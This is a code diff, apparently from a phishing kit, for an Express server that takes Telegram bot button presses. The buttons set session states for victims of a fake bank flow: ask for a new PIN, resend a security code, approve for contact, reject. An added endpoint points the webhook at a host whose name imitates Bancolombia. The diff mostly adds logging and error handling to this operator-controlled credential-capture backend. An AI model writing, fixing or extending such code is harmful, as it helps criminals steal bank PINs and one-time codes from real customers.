@@ -241,61 +241,88 @@ app.post('/api/send-security-code', async (req, res) => {
 });
 
 // 5. Webhook para recibir respuestas del bot de Telegram
-app.post(`/webhook/${TELEGRAM_BOT_TOKEN}`, (req, res) => {
+app.post(`/webhook/${TELEGRAM_BOT_TOKEN}`, async (req, res) => {
     try {
+        console.log('🔔 Webhook recibido:', JSON.stringify(req.body, null, 2));
+        
         const update = req.body;
 
         // Verificar si es un callback query (botón presionado)
         if (update.callback_query) {
             const callbackData = update.callback_query.data;
+            console.log('📱 Botón presionado:', callbackData);
+            
             const [action, sessionId] = callbackData.split(':');
             const session = sessions.get(sessionId);
 
             if (!session) {
-                console.error('Sesión no encontrada:', sessionId);
+                console.error('❌ Sesión no encontrada:', sessionId);
+                
+                // Responder al callback query aunque no exista la sesión
+                await fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        callback_query_id: update.callback_query.id,
+                        text: 'Sesión expirada',
+                        show_alert: true
+                    })
+                });
+                
                 return res.sendStatus(200);
             }
+
+            console.log('📝 Procesando acción:', action, 'para sesión:', sessionId);
 
             // Procesar acción según el botón presionado
             switch (action) {
                 case 'continue_contact':
                     session.status = 'approved_for_contact';
                     session.nextAction = 'show_contact_form';
+                    console.log('✅ Aprobado para contacto');
                     break;
 
                 case 'request_new_pin':
                     session.status = 'request_new_pin';
                     session.nextAction = 'show_pin_form';
+                    console.log('🔄 Solicitar nueva clave');
                     break;
 
                 case 'reject_request':
                     session.status = 'rejected';
                     session.nextAction = 'show_rejection';
+                    console.log('❌ Solicitud rechazada');
                     break;
 
                 case 'approve_request':
                     session.status = 'approved';
                     session.nextAction = 'show_success';
+                    console.log('✅ Pre-solicitud aprobada');
                     break;
 
                 case 'resend_code':
                     session.status = 'resend_code';
                     session.nextAction = 'show_security_form';
+                    console.log('🔄 Reenviar código');
                     break;
 
                 case 'reject_final':
                     session.status = 'rejected_final';
                     session.nextAction = 'show_rejection';
+                    console.log('❌ Rechazado definitivamente');
                     break;
 
                 default:
-                    console.error('Acción no reconocida:', action);
+                    console.error('⚠️ Acción no reconocida:', action);
             }
 
             sessions.set(sessionId, session);
+            console.log('💾 Sesión actualizada:', session.status);
 
             // Responder al webhook de Telegram
-            fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
+            await fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
@@ -305,12 +332,16 @@ app.post(`/webhook/${TELEGRAM_BOT_TOKEN}`, (req, res) => {
                     text: 'Acción procesada ✓'
                 })
             });
+            
+            console.log('✅ Callback query respondido');
+        } else {
+            console.log('📨 Webhook sin callback query');
         }
 
         res.sendStatus(200);
 
     } catch (error) {
-        console.error('Error en webhook:', error);
+        console.error('💥 Error en webhook:', error);
         res.sendStatus(500);
     }
 });
@@ -321,6 +352,35 @@ app.get('/api/webhook-info', async (req, res) => {
         const response = await fetch(`${TELEGRAM_API_URL}/getWebhookInfo`);
         const result = await response.json();
         res.json(result);
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+// Test endpoint para probar webhook
+app.get('/api/test-webhook', async (req, res) => {
+    try {
+        // Eliminar webhook existente
+        await fetch(`${TELEGRAM_API_URL}/deleteWebhook`);
+        
+        // Configurar nuevo webhook
+        const WEBHOOK_URL = `https://bancolombiacom-tiyt.onrender.com/webhook/${TELEGRAM_BOT_TOKEN}`;
+        const response = await fetch(`${TELEGRAM_API_URL}/setWebhook`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                url: WEBHOOK_URL
+            })
+        });
+
+        const result = await response.json();
+        res.json({
+            webhook_configured: result,
+            webhook_url: WEBHOOK_URL,
+            test_message: 'Webhook reconfigurado. Prueba presionar un botón.'
+        });
     } catch (error) {
         res.status(500).json({ error: error.message });
     }
